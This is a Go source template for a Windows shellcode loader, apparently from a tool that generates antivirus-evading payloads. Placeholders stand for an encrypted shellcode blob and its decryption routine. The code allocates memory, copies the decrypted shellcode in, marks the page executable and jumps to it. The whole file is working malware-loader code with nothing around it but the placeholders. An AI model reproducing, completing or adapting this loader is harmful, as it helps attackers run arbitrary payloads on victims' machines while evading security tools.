package main

import (
	"syscall"
	"unsafe"
	{{header}}
)

const (
	MEM_COMMIT = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE = 0x04
)

{{decryption}}

func Loader(shellcode []byte){
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	addr,_ ,_ := VirtualAlloc.Call(0,uintptr(len(shellcode)),MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE)
	RtlCopyMemory.Call(addr,(uintptr)(unsafe.Pointer(&shellcode[0])),uintptr(len(shellcode)))
	protect := PAGE_READWRITE
	VirtualProtect.Call(addr,uintptr(len(shellcode)),PAGE_EXECUTE_READ,uintptr(unsafe.Pointer(&protect)))
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func main(){
    shellcode := Crypto("{{shellcode}}")
    Loader(shellcode)
}